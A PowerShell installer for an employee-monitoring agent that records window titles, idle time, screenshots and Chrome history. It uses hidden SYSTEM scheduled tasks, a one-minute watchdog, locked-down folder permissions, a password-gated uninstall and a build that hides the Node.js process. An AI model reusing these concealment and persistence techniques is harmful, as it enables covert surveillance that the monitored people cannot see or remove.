<#
===============================================================================
  Easyskill Windows Monitoring Agent - one-shot deployer
===============================================================================

  Right-click  deploy.ps1  ->  Run with PowerShell (or run as Admin):
      powershell -ExecutionPolicy Bypass -File deploy.ps1

  What it does, in order:
    1. Elevates to Administrator (required for scheduled tasks).
    2. Installs Node.js if it is missing (portable copy, no Program Files,
       no MSI - so it works on a locked-down company image).
    3. Copies the agent to  %ProgramData%\EasyskillMonitor
    4. Writes config.json (server URL + shared agent key + machine name).
    5. Installs npm dependencies.
    6. Registers two SYSTEM scheduled tasks:
         Easyskill\AgentSupervisor  - starts at boot AND at every logon,
                                      restarts on failure every minute
         Easyskill\AgentKeeper      - fires every 60 s and restarts the
                                      supervisor if anything killed it
    7. Starts it and verifies that processes are alive + the log is flowing.

  The supervisor starts the monitor *inside each logged-in user's desktop
  session* (not in Session 0), which is what makes window titles, idle time,
  screenshots and Chrome history actually reflect the employee.

  Runtime: if a prebuilt executable exists in dist\ (see tools/build.js) it is
  installed instead of Node.js - one file, no runtime, no node_modules and no
  process called node.exe on the employee's machine. Without dist\ this falls
  back to a normal Node.js install.

  Other modes:
      powershell -ExecutionPolicy Bypass -File deploy.ps1 -Status
      powershell -ExecutionPolicy Bypass -File deploy.ps1 -Uninstall
                                                (password-protected)

  Unattended / mass deployment (no prompts):
      powershell -ExecutionPolicy Bypass -File deploy.ps1 -NonInteractive `
                  -ServerUrl "https://your-server.onrender.com" -AgentKey "XXXX" `
                  -SetUninstallPassword "ChooseAKeptSecret"

  Tamper resistance:
    - the install folder is read-only for the logged-in user; only state\
      (logs + event outbox) is writable by them
    - uninstall needs a password (stored only as a salted SHA-256 hash)
    - tasks are SYSTEM-owned and hidden, so a standard user cannot stop,
      edit or delete them; killing the process only buys ~10 s
#>


[CmdletBinding()]
param(
    [string]$ServerUrl = '',
    [string]$AgentKey = '',
    [string]$InstallDir = '',
    [int]$ScreenshotIntervalSec = 300,
    [switch]$DisableScreenshots,
    [switch]$NonInteractive,
    [switch]$Status,
    [switch]$Uninstall,
    # Uninstall is password-gated so the employee cannot remove the agent even
    # if they get hold of this script. Set on install, stored only as a salted
    # SHA-256 hash in the installed config.json.
    [string]$SetUninstallPassword = '',
    [string]$UninstallPassword = '',
    # Only bypasses the gate when no password hash is on record (legacy install).
    [switch]$Force
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version 2.0

$TaskPath    = '\Easyskill\'
$SupTaskName = 'AgentSupervisor'
$KeepTaskName = 'AgentKeeper'
$SUPERVISOR_STARTUP_DELAY_SEC = 20

function Say($msg)  { Write-Host $msg }
function Step($msg) { Write-Host "==> $msg" -ForegroundColor Cyan }
function Ok($msg)   { Write-Host "  [OK] $msg" -ForegroundColor Green }
function Warn($msg) { Write-Host "  [!] $msg" -ForegroundColor Yellow }
function Fail($msg) { Write-Host "  [FAIL] $msg" -ForegroundColor Red }

# ---------------------------------------------------------------------------
# uninstall password  (salted SHA-256 - the plaintext is never written to disk)
# ---------------------------------------------------------------------------
function New-HexBytes([int]$Length) {
    $buf = New-Object byte[] $Length
    $rng = [Security.Cryptography.RandomNumberGenerator]::Create()
    try { $rng.GetBytes($buf) } finally { $rng.Dispose() }
    return (($buf | ForEach-Object { $_.ToString('x2') }) -join '')
}

function Get-UninstallHash([string]$Password, [string]$Salt) {
    $sha = [Security.Cryptography.SHA256]::Create()
    try {
        $bytes = [Text.Encoding]::UTF8.GetBytes("$Salt|$Password")
        return (($sha.ComputeHash($bytes) | ForEach-Object { $_.ToString('x2') }) -join '')
    } finally { $sha.Dispose() }
}

function ConvertFrom-SecureStringPlain([Security.SecureString]$Secure) {
    $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($Secure)
    try { return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr) }
    finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr) }
}

# Returns: 'ok' | 'wrong' | 'norecord'
function Test-UninstallPassword([string]$Supplied, $Cfg) {
    $sec = $null
    if ($Cfg) { $sec = $Cfg.PSObject.Properties['security'] }
    $hash = $null; $salt = $null
    if ($sec -and $sec.Value) {
        $h = $sec.Value.PSObject.Properties['uninstallHash']
        $s = $sec.Value.PSObject.Properties['uninstallSalt']
        if ($h) { $hash = $h.Value }
        if ($s) { $salt = $s.Value }
    }
    if (-not $hash) { return 'norecord' }
    if ($null -eq $Supplied -or $Supplied -eq '') { return 'wrong' }
    if ((Get-UninstallHash $Supplied $salt) -ieq $hash) { return 'ok' }
    return 'wrong'
}

# Builds the `security` block for the installed config.
# Returns @{ block = <hashtable>; password = <string or $null> }
#   password is non-null only when a brand new one was generated, so the caller
#   can print it exactly once (it is never stored in plaintext).
function New-UninstallSecret {
    param(
        [string]$ExistingHash,
        [string]$ExistingSalt,
        [string]$Requested,
        [switch]$KeepExisting
    )

    if ($Requested) {
        $salt = New-HexBytes 16
        return @{
            block    = [ordered]@{ uninstallSalt = $salt; uninstallHash = (Get-UninstallHash $Requested $salt) }
            password = $null
        }
    }
    if ($KeepExisting -and $ExistingHash -and $ExistingSalt) {
        return @{
            block    = [ordered]@{ uninstallSalt = $ExistingSalt; uninstallHash = $ExistingHash }
            password = $null
        }
    }
    $pw = New-HexBytes 12
    $salt = New-HexBytes 16
    return @{
        block    = [ordered]@{ uninstallSalt = $salt; uninstallHash = (Get-UninstallHash $pw $salt) }
        password = $pw
    }
}

# ---------------------------------------------------------------------------
# elevation
# ---------------------------------------------------------------------------
function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p  = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Assert-Admin {
    if (Test-Admin) { return }
    Warn 'Administrator rights required - relaunching elevated...'
    $script = $MyInvocation.PSCommandPath
    if (-not $script) { $script = $PSCommandPath }
    $argList = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', "`"$script`"")
    foreach ($a in $PSBoundParameters.GetEnumerator()) {
        if ($a.Value -is [switch]) {
            if ($a.Value) { $argList += "-$($a.Key)" }
        } else {
            $argList += "-$($a.Key)"; $argList += "`"$($a.Value)`""
        }
    }
    try {
        Start-Process -FilePath 'powershell.exe' -Verb RunAs -ArgumentList $argList -Wait
    } catch {
        Fail 'Could not elevate. Right-click the file and choose "Run as administrator".'
    }
    exit
}

# ---------------------------------------------------------------------------
# node.js
# ---------------------------------------------------------------------------
function Find-Node {
    $cmd = Get-Command node -ErrorAction SilentlyContinue
    if ($cmd -and $cmd.Source) {
        $v = & node -v 2>$null
        if ($v -match '^v(\d+)') { return @{ Path = $cmd.Source; Version = $v } }
    }
    foreach ($p in @(
        "$env:ProgramFiles\nodejs\node.exe",
        "${env:ProgramFiles(x86)}\nodejs\node.exe",
        "$env:LOCALAPPDATA\Programs\nodejs\node.exe"
    )) {
        if ($p -and (Test-Path $p)) {
            $v = & $p -v 2>$null
            return @{ Path = $p; Version = $v }
        }
    }
    return $null
}

function Install-NodePortable {
    param([string]$TargetDir)

    Step 'Node.js not found - installing a portable copy'
    $runtime = Join-Path $TargetDir 'runtime'
    $nodeDir = Join-Path $runtime 'node'

    $arch = 'x64'
    if ($env:PROCESSOR_ARCHITECTURE -match 'ARM64') { $arch = 'arm64' }

    $index = Invoke-RestMethod 'https://nodejs.org/dist/index.json' -UseBasicParsing -TimeoutSec 60
    $rel = $index | Where-Object { $_.lts -and $_.lts -ne $false } | Select-Object -First 1
    if (-not $rel) { throw 'Could not determine the latest Node.js LTS release.' }
    $ver = $rel.version
    Say "  Node.js $ver (LTS) for $arch"

    $zip = Join-Path $runtime ("node-{0}-win-{1}.zip" -f $ver, $arch)
    if (-not (Test-Path $zip)) {
        New-Item -ItemType Directory -Force -Path $runtime | Out-Null
        $url = "https://nodejs.org/dist/$ver/node-$ver-win-$arch.zip"
        Say "  Downloading $url"
        Invoke-WebRequest -Uri $url -OutFile $zip -UseBasicParsing -TimeoutSec 600
    }

    $tmp = Join-Path $runtime '_extract'
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
    Expand-Archive -Path $zip -DestinationPath $tmp -Force
    if (Test-Path $nodeDir) { Remove-Item $nodeDir -Recurse -Force -ErrorAction SilentlyContinue }
    $src = Get-ChildItem $tmp -Directory | Select-Object -First 1
    Move-Item -Path $src.FullName -Destination $nodeDir
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue

    $exe = Join-Path $nodeDir 'node.exe'
    if (-not (Test-Path $exe)) { throw 'Node.js extraction failed - node.exe missing.' }
    $v = & $exe -v
    Ok "Portable Node.js installed: $v"
    return $exe
}

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
function Read-Json($path) {
    try { return (Get-Content $path -Raw -ErrorAction Stop | ConvertFrom-Json) } catch { return $null }
}

function Write-AgentConfig {
    param([string]$Path, [string]$Server, [string]$Key, [int]$ShotInterval, [bool]$Shots,
          [System.Collections.IDictionary]$Security = $null)

    $cfg = [ordered]@{
        serverUrl            = $Server
        agentKey             = $Key
        machineName          = $env:COMPUTERNAME
        sendInterval         = 10000
        batchSize            = 50
        maxQueue             = 50000
        screenshotInterval   = ($ShotInterval * 1000)
        idleThreshold        = 300000
        enableScreenshots    = $Shots
        processPollInterval  = 300000
        networkPollInterval  = 300000
    }
    if ($Security) { $cfg['security'] = $Security }
    ($cfg | ConvertTo-Json -Depth 5) | Set-Content -Path $Path -Encoding UTF8

    # PowerShell 5.1's Set-Content -Encoding UTF8 writes a BOM, which breaks
    # JSON.parse in Node. Rewrite without one so the agentKey is actually read.
    try {
        $bytes = [System.Text.UTF8Encoding]::new($false).GetBytes((Get-Content -LiteralPath $Path -Raw))
        [System.IO.File]::WriteAllBytes($Path, $bytes)
    } catch { Warn "Could not strip BOM from $Path - the agent will report a config error" }
}

# ---------------------------------------------------------------------------
# scheduled tasks
# ---------------------------------------------------------------------------
function Register-AgentTasks {
    param([string]$NodeExe, [string]$WorkDir)

    # Bundled exe dispatches on flags; source install runs the script files.
    $supArg, $keepArg = if ($script:BundledExe) {
        @('--supervisor', '--supervisor --once')
    } else {
        @("`"$WorkDir\supervisor.js`"", "`"$WorkDir\supervisor.js`" --once")
    }

    $actionSup  = New-ScheduledTaskAction -Execute $NodeExe -Argument $supArg -WorkingDirectory $WorkDir
    $actionKeep = New-ScheduledTaskAction -Execute $NodeExe -Argument $keepArg -WorkingDirectory $WorkDir

    # Boot: start as soon as Windows comes up, before anyone logs on.
    $tBoot = New-ScheduledTaskTrigger -AtStartup
    $tBoot.Delay = "PT$SUPERVISOR_STARTUP_DELAY_SEC`S"
    # Logon: start again the moment a user logs in, so their session gets an agent.
    $tLogon = New-ScheduledTaskTrigger -AtLogOn
    $tLogon.Delay = 'PT10S'
    # Belt-and-braces: re-check every 15 min even if the trigger was missed.
    $tRep = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 15)

    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest

    $settings = New-ScheduledTaskSettingsSet -Hidden `
        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
        -StartWhenAvailable `
        -ExecutionTimeLimit ([TimeSpan]::Zero) `
        -MultipleInstances IgnoreNew `
        -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
        -DontStopOnIdleEnd

    Register-ScheduledTask -TaskName $SupTaskName -TaskPath $TaskPath `
        -Action $actionSup -Trigger @($tBoot, $tLogon, $tRep) `
        -Principal $principal -Settings $settings -Force | Out-Null
    Ok "Task registered: $TaskPath$SupTaskName  (boot + logon + every 15 min, restart on failure)"

    # The keeper is a short-lived one-shot that runs every minute forever.
    $tKeep = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(15) -RepetitionInterval (New-TimeSpan -Minutes 1)
    $keepSettings = New-ScheduledTaskSettingsSet -Hidden `
        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
        -StartWhenAvailable `
        -ExecutionTimeLimit (New-TimeSpan -Minutes 5) `
        -MultipleInstances IgnoreNew `
        -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)

    Register-ScheduledTask -TaskName $KeepTaskName -TaskPath $TaskPath `
        -Action $actionKeep -Trigger $tKeep `
        -Principal $principal -Settings $keepSettings -Force | Out-Null
    Ok "Task registered: $TaskPath$KeepTaskName  (every 1 min safety net)"
}

function Remove-AgentTasks {
    foreach ($t in @($SupTaskName, $KeepTaskName)) {
        try {
            Unregister-ScheduledTask -TaskName $t -TaskPath $TaskPath -Confirm:$false -ErrorAction Stop
            Ok "Task removed: $TaskPath$t"
        } catch {
            try {
                schtasks /Delete /TN "$TaskPath$t" /F 2>&1 | Out-Null
                Ok "Task removed: $TaskPath$t"
            } catch { }
        }
    }
    # legacy service from earlier installs
    foreach ($svc in @('EasyskillMonitor', 'Windows Employee Monitor')) {
        $existing = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($existing) {
            try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue } catch { }
            & sc.exe delete "$svc" 2>&1 | Out-Null
            Ok "Legacy service removed: $svc"
        }
    }
}

# ---------------------------------------------------------------------------
# file copy
# ---------------------------------------------------------------------------
function Install-AgentFiles {
    param([string]$Src, [string]$Dst)

    New-Item -ItemType Directory -Force -Path $Dst | Out-Null

    # --- single-file build (preferred): one exe, no runtime, no node_modules ---
    if ($script:BundledExe) {
        Copy-Item $script:BundledExe.FullName (Join-Path $Dst $script:BundledExe.Name) -Force
        Ok "Bundled executable: $($script:BundledExe.Name)"

        # Still shipped on disk: the PowerShell helpers the supervisor calls and
        # the sql.js wasm (the browser-history monitor loads it at runtime).
        foreach ($d in @('scripts')) {
            $sp = Join-Path $Src $d
            if (Test-Path $sp) {
                $dp = Join-Path $Dst $d
                if (Test-Path $dp) { Remove-Item $dp -Recurse -Force -ErrorAction SilentlyContinue }
                Copy-Item $sp $dp -Recurse -Force
            }
        }
        $wasm = Join-Path $Src 'node_modules\sql.js\dist\sql-wasm.wasm'
        if (Test-Path $wasm) { Copy-Item $wasm (Join-Path $Dst 'sql-wasm.wasm') -Force }

        # Drop leftovers from a previous Node-based install.
        Remove-Item (Join-Path $Dst 'node_modules') -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item (Join-Path $Dst 'monitors') -Recurse -Force -ErrorAction SilentlyContinue
        foreach ($f in @('monitor.js', 'supervisor.js', 'entry.js', 'lib.js')) {
            Remove-Item (Join-Path $Dst $f) -Force -ErrorAction SilentlyContinue
        }
        return
    }

    # --- source install: needs Node.js + node_modules --------------------------
    $files = @('monitor.js', 'supervisor.js', 'entry.js', 'lib.js', 'package.json')
    if (Test-Path (Join-Path $Src 'package-lock.json')) { $files += 'package-lock.json' }

    foreach ($f in $files) {
        $p = Join-Path $Src $f
        if (Test-Path $p) { Copy-Item $p $Dst -Force }
    }

    foreach ($d in @('monitors', 'scripts')) {
        $sp = Join-Path $Src $d
        if (Test-Path $sp) {
            $dp = Join-Path $Dst $d
            if (Test-Path $dp) { Remove-Item $dp -Recurse -Force -ErrorAction SilentlyContinue }
            Copy-Item $sp $dp -Recurse -Force
        }
    }

    # carry over a bundled node_modules so the target needs no npm/internet
    $srcNm = Join-Path $Src 'node_modules'
    if ((Test-Path $srcNm) -and -not (Test-Path (Join-Path $Dst 'node_modules'))) {
        Copy-Item $srcNm (Join-Path $Dst 'node_modules') -Recurse -Force
        Ok 'Reused bundled node_modules (offline install)'
    }
}

# ---------------------------------------------------------------------------
# folder permissions + user-writable state folder
# ---------------------------------------------------------------------------
# The install folder must be read-only for the logged-in employee: they get no
# write, no create and no delete there, so they cannot replace, break or remove
# the agent. The agent still needs somewhere to produce logs and queue events,
# which is what state\ is for (the only subfolder the user may write to).
# Replaces an object's DACL with exactly three ACEs and turns inheritance off:
#   SYSTEM + Administrators = full, Users = $UserRights.
# Uses .NET rather than icacls: on Windows 11 `icacls /grant` reports success
# without writing anything to files, and the `/inheritance:r` that follows
# then strips the inherited ACEs and leaves a deny-all DACL nobody can read.
function Set-AppAcl {
    param(
        [string]$Path,
        [Security.AccessControl.FileSystemRights]$UserRights
    )

    $acl = Get-Acl -LiteralPath $Path
    foreach ($r in @($acl.Access)) {
        try { [void]$acl.RemoveAccessRule($r) } catch { }
    }
    # Protect + discard: inherited ACEs (the old "Users may write-create" and
    # CREATOR OWNER entries) disappear instead of being kept.
    $acl.SetAccessRuleProtection($true, $false)

    $if = [Security.AccessControl.InheritanceFlags]::None
    if ([IO.Directory]::Exists($Path)) {
        $if = [Security.AccessControl.InheritanceFlags]::ContainerInherit -bor `
              [Security.AccessControl.InheritanceFlags]::ObjectInherit
    }

    $entries = @(
        @{ Sid = 'S-1-5-18';     Rights = [Security.AccessControl.FileSystemRights]::FullControl },
        @{ Sid = 'S-1-5-32-544'; Rights = [Security.AccessControl.FileSystemRights]::FullControl },
        @{ Sid = 'S-1-5-32-545'; Rights = $UserRights }
    )
    foreach ($e in $entries) {
        $sid = New-Object -TypeName Security.Principal.SecurityIdentifier -ArgumentList $e.Sid
        # NOTE the parameter order: InheritanceFlags and PropagationFlags come
        # BEFORE AccessControlType. Getting it wrong silently builds a rule with
        # InheritanceFlags=None, which stops new files from inheriting anything
        # and leaves them with an empty (deny-all) DACL the moment they appear.
        $rule = New-Object -TypeName Security.AccessControl.FileSystemAccessRule -ArgumentList @(
            $sid,
            $e.Rights,
            $if,
            [Security.AccessControl.PropagationFlags]::None,
            [Security.AccessControl.AccessControlType]::Allow
        )
        [void]$acl.AddAccessRule($rule)
    }
    Set-Acl -LiteralPath $Path -AclObject $acl
}

# takeown + Set-AppAcl over the whole tree: everyone keeps only what they
# should, and the running install folder becomes usable again (a previous run
# may have left files unwritable, and the installer has to overwrite them).
# Returns the number of paths secured.
function Lock-AgentFolder {
    param([string]$Dir)

    # Own every object first. Files the SYSTEM supervisor created belong to
    # SYSTEM, and nobody else may change their DACL. takeown runs with
    # SeBackupPrivilege, so it works even on a file we cannot open. /A hands
    # ownership to the Administrators group so Set-Acl can then write.
    $tk = & takeown.exe /F $Dir /R /A /D Y 2>&1 | ForEach-Object { "$_" }
    $tkFail = @($tk | Where-Object { $_ -match 'ERROR|denied' })
    if ($tkFail.Count) { Warn "takeown could not complete on $($tkFail.Count) path(s)" }

    $stateFull = [IO.Path]::GetFullPath((Join-Path $Dir 'state'))
    $items = @($Dir) + @(Get-ChildItem $Dir -Recurse -Force -ErrorAction SilentlyContinue)
    $secured = 0; $failed = 0
    foreach ($it in $items) {
        $p = if ($it -is [string]) { $it } else { $it.FullName }
        # Only state\ may be written by the employee; everything else is
        # read+execute for them and they cannot create, change or delete it.
        $rights = if ($p.StartsWith($stateFull, [StringComparison]::OrdinalIgnoreCase)) {
                      [Security.AccessControl.FileSystemRights]::Modify
                  } else {
                      [Security.AccessControl.FileSystemRights]::ReadAndExecute
                  }
        try {
            Set-AppAcl -Path $p -UserRights $rights
            $secured++
        } catch {
            $failed++
            if ($failed -le 3) { Warn "Could not secure ${p}: $($_.Exception.Message)" }
        }
    }
    if ($failed) { Warn "$failed of $($items.Count) path(s) could not be secured" }
    return $secured
}

# Prove the tree is locked down: every object must be protected and carry
# exactly SYSTEM F + Administrators F + Users <rights>.
function Test-AgentAcl {
    param([string]$Dir)
    $stateFull = [IO.Path]::GetFullPath((Join-Path $Dir 'state'))
    $items = @($Dir) + @(Get-ChildItem $Dir -Recurse -Force -ErrorAction SilentlyContinue)
    $bad = 0
    foreach ($it in $items) {
        $p = if ($it -is [string]) { $it } else { $it.FullName }
        try {
            $a = Get-Acl -LiteralPath $p
            if (-not $a.AreAccessRulesProtected -or $a.Access.Count -ne 3) { $bad++ }
        } catch { $bad++ }
    }
    return $bad
}

function Protect-AgentFolder {
    param([string]$Dir)

    $state = Join-Path $Dir 'state'

    Step 'Moving runtime files into state\'
    Get-ChildItem $Dir -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -like 'agent-*.log*' -or $_.Name -like 'outbox-*.json' } |
        ForEach-Object {
            New-Item -ItemType Directory -Force -Path $state | Out-Null
            try {
                Move-Item $_.FullName (Join-Path $state $_.Name) -Force -ErrorAction Stop
            } catch {
                Warn "Could not move $($_.Name): $($_.Exception.Message)"
            }
        }
    New-Item -ItemType Directory -Force -Path $state | Out-Null

    Step 'Locking down folder permissions'
    $secured = Lock-AgentFolder -Dir $Dir
    $bad = Test-AgentAcl -Dir $Dir
    if ($bad) { Warn "$bad path(s) still have an unexpected ACL" }
    else {
        Ok "Locked $secured path(s)"
        Ok 'Agent files are read-only for the logged-in user'
        Ok 'state\ is writable by the user (logs + event outbox)'
    }
}

function Invoke-NpmInstall {
    param([string]$WorkDir, [string]$NodeExe)

    $nm = Join-Path $WorkDir 'node_modules'
    if ((Test-Path (Join-Path $nm 'chokidar')) -and (Test-Path (Join-Path $nm 'sql.js'))) {
        Ok 'Dependencies already present'
        return
    }

    Step 'Installing npm dependencies'
    $npm = Join-Path (Split-Path $NodeExe) 'npm.cmd'
    if (-not (Test-Path $npm)) { $npm = (Get-Command npm.cmd -ErrorAction SilentlyContinue).Source }
    if (-not $npm) {
        Warn 'npm not found - agent will fail if node_modules is missing'
        return
    }

    Push-Location $WorkDir
    try {
        & $npm install --omit=dev --no-audit --no-fund --loglevel=error 2>&1 |
            ForEach-Object { "$_" } | Select-Object -Last 15 |
            ForEach-Object { Say "    $_" }
        if ($LASTEXITCODE -eq 0) {
            Ok 'Dependencies installed'
        } else {
            Warn "npm exited with code $LASTEXITCODE - check the output above"
        }
    } finally { Pop-Location }
}

# ---------------------------------------------------------------------------
# verification
# ---------------------------------------------------------------------------
function Get-AgentProcesses {
    $list = @()
    try {
        $names = @('node.exe')
        if ($script:BundledExe) { $names += $script:BundledExe.Name }
        if ($InstallDir -and (Test-Path $InstallDir)) {
            $names += @(Get-ChildItem -Path $InstallDir -Filter '*.exe' -File -ErrorAction SilentlyContinue | ForEach-Object Name)
        }
        $filter = (($names | Select-Object -Unique | ForEach-Object { "Name = '$_'" }) -join ' OR ')
        $list = @(Get-CimInstance Win32_Process -Filter $filter |
            Where-Object { $_.CommandLine -and ($_.CommandLine -match 'monitor\.js|supervisor\.js|--monitor\b|--supervisor\b') })
    } catch { }
    return $list
}

function Test-Deployment {
    param([string]$WorkDir)

    Step 'Verifying deployment'
    $procs = @(Get-AgentProcesses)
    if ($procs.Count -gt 0) {
        Ok "$($procs.Count) agent process(es) running"
        foreach ($p in $procs) {
            $kind = if ($p.CommandLine -match 'supervisor\.js|--supervisor\b') { 'supervisor' } else { 'agent    ' }
            Say "        $kind  pid=$($p.ProcessId)  session=$($p.SessionId)"
        }
    } else {
        Warn 'No agent process seen yet (may still be starting up)'
    }

    $log = Join-Path $WorkDir 'supervisor.log'
    if (Test-Path $log) {
        Ok 'supervisor.log:'
        Get-Content $log -Tail 6 -ErrorAction SilentlyContinue | ForEach-Object { Say "        $_" }
    }

    try {
        $health = Invoke-RestMethod -Uri "$ServerUrl/api/health" -TimeoutSec 15
        Ok "Dashboard reachable: $($health.status)"
    } catch {
        Warn "Dashboard not reachable from here: $($_.Exception.Message)"
        Say '        (the agent keeps retrying with backoff, so a temporary outage is fine)'
    }

    $agentLog = Get-ChildItem -Path @(
                    (Join-Path $WorkDir 'state\agent-*.log'),
                    (Join-Path $WorkDir 'agent-*.log')     # pre-state layout
                ) -ErrorAction SilentlyContinue |
                Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if ($agentLog) {
        Ok "Latest agent log: $($agentLog.Name)"
        Get-Content $agentLog.FullName -Tail 4 -ErrorAction SilentlyContinue | ForEach-Object { Say "        $_" }
    }
}

function Show-Status {
    Step 'Deployment status'
    if (-not $InstallDir -or -not (Test-Path $InstallDir)) {
        Warn "Agent not installed ($InstallDir)"
        return
    }
    Say "  Install dir : $InstallDir"
    $bundled = @(Get-ChildItem -Path $InstallDir -Filter '*.exe' -File -ErrorAction SilentlyContinue | Select-Object -First 1)
    if ($bundled) {
        Say "  Runtime     : bundled executable ($($bundled[0].Name))"
    } elseif (Test-Path (Join-Path $InstallDir 'node_modules')) {
        Say '  Runtime     : Node.js + node_modules'
    } else {
        Say '  Runtime     : unknown'
    }
    $cfg = Read-Json (Join-Path $InstallDir 'config.json')
    if ($cfg) {
        Say "  Server URL  : $($cfg.serverUrl)"
        Say "  Machine name: $($cfg.machineName)"
        Say "  Screenshots : $($cfg.enableScreenshots) every $($cfg.screenshotInterval / 1000)s"
    }
    foreach ($t in @($SupTaskName, $KeepTaskName)) {
        $task = Get-ScheduledTask -TaskName $t -TaskPath $TaskPath -ErrorAction SilentlyContinue
        if ($task) {
            $info = $task | Get-ScheduledTaskInfo
            $state = if ($task.State) { "$($task.State)" } else { 'Unknown' }
            Say "  Task $t : $state  (last run $($info.LastRunTime))"
        } else {
            Warn "Task $t not registered"
        }
    }
    $procs = @(Get-AgentProcesses)
    if ($procs.Count) {
        Ok "$($procs.Count) agent process(es) running"
    } else {
        Warn 'No agent process running'
    }
    $log = Join-Path $InstallDir 'supervisor.log'
    if (Test-Path $log) {
        Say '  --- last supervisor lines ---'
        Get-Content $log -Tail 8 -ErrorAction SilentlyContinue | ForEach-Object { Say "    $_" }
    }
    $aLog = Get-ChildItem -Path @(
                (Join-Path $InstallDir 'state\agent-*.log'),
                (Join-Path $InstallDir 'agent-*.log')
            ) -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if ($aLog) {
        Say "  --- last agent lines ($($aLog.Name)) ---"
        Get-Content $aLog.FullName -Tail 6 -ErrorAction SilentlyContinue | ForEach-Object { Say "    $_" }
    }
    $cfgSec = $null
    if ($cfg) { $cfgSec = $cfg.PSObject.Properties['security'] }
    if ($cfgSec -and $cfgSec.Value -and $cfgSec.Value.PSObject.Properties['uninstallHash']) {
        Say '  Uninstall  : password-protected'
    } else {
        Say '  Uninstall  : NOT password-protected'
    }
}

# ===========================================================================
# main
# ===========================================================================

if (-not $InstallDir) { $InstallDir = Join-Path $env:ProgramData 'EasyskillMonitor' }
$SourceDir = Split-Path -Parent $PSCommandPath
$SrcConfig = Join-Path $SourceDir 'config.json'

# A prebuilt single-file executable (produced by tools/build.js) turns this into
# a Node-free install: no runtime, no node_modules, nothing called node.exe on
# the employee's machine. Source installs keep working when dist\ is absent.
$BundledExe = $null
$distDir = Join-Path $SourceDir 'dist'
if (Test-Path $distDir) {
    $BundledExe = Get-ChildItem -Path $distDir -Filter '*.exe' -File -ErrorAction SilentlyContinue |
        Sort-Object LastWriteTime -Descending | Select-Object -First 1
}

if ($Uninstall) {
    Assert-Admin
    Step 'Uninstalling monitoring agent'

    # --- password gate -------------------------------------------------------
    $cfg = Read-Json (Join-Path $InstallDir 'config.json')
    $pw = $UninstallPassword
    if (-not $pw) {
        if ($NonInteractive) {
            Fail 'Uninstall is password-protected. Pass -UninstallPassword "<password>".'
            exit 1
        }
        $pw = ConvertFrom-SecureStringPlain (Read-Host ' Uninstall password' -AsSecureString)
    }
    switch (Test-UninstallPassword -Supplied $pw -Cfg $cfg) {
        'ok'      { Ok 'Password accepted' }
        'wrong'   { Fail 'Incorrect uninstall password - nothing was removed.'; exit 1 }
        'norecord' {
            if (-not $Force) {
                Fail 'No uninstall password is on record for this install.'
                Say '      Pass -Force to remove it anyway (legacy installs only).'
                exit 1
            }
            Warn 'No uninstall password on record - continuing because -Force was passed'
        }
    }

    try { Stop-ScheduledTask -TaskName $SupTaskName -TaskPath $TaskPath -ErrorAction SilentlyContinue } catch { }
    try { Stop-ScheduledTask -TaskName $KeepTaskName -TaskPath $TaskPath -ErrorAction SilentlyContinue } catch { }
    # Wait for the processes to be really gone: deleting the folder while the
    # supervisor still holds supervisor.lock open leaves that file behind.
    foreach ($attempt in 1..5) {
        Get-AgentProcesses | ForEach-Object {
            try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch { }
        }
        Start-Sleep -Seconds 2
        if (@(Get-AgentProcesses).Count -eq 0) { break }
    }
    Remove-AgentTasks
    Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Startup\SysMonAgent.vbs') -Force -ErrorAction SilentlyContinue
    Remove-Item (Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs\Startup\SysMonAgent.vbs') -Force -ErrorAction SilentlyContinue
    # Legacy cleanup: remove only our own value, never the whole Run key -
    # deleting the key would wipe every other program's startup entry.
    foreach ($rk in @(
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
    )) {
        foreach ($vn in @('SysMonAgent', 'EasyskillMonitor')) {
            try {
                if (Get-ItemProperty -Path $rk -Name $vn -ErrorAction SilentlyContinue) {
                    Remove-ItemProperty -Path $rk -Name $vn -Force -ErrorAction Stop
                }
            } catch { }
        }
    }
    for ($try = 1; $try -le 5 -and (Test-Path $InstallDir); $try++) {
        Remove-Item (Join-Path $InstallDir 'supervisor.lock') -Force -ErrorAction SilentlyContinue
        Remove-Item $InstallDir -Recurse -Force -ErrorAction SilentlyContinue
        if (-not (Test-Path $InstallDir)) { break }
        Start-Sleep -Seconds 1
    }
    if (Test-Path $InstallDir) {
        # last resort - handles a handle Windows would not release in time
        & cmd.exe /c "rmdir /s /q `"$InstallDir`"" 2>&1 | Out-Null
    }
    if (Test-Path $InstallDir) {
        Warn "Could not fully remove $InstallDir"
        $left = @(Get-ChildItem $InstallDir -Recurse -Force -ErrorAction SilentlyContinue)
        if ($left.Count) { Say "        left behind: $(($left | ForEach-Object Name) -join ', ')" }
    } else {
        Ok "Removed $InstallDir"
    }
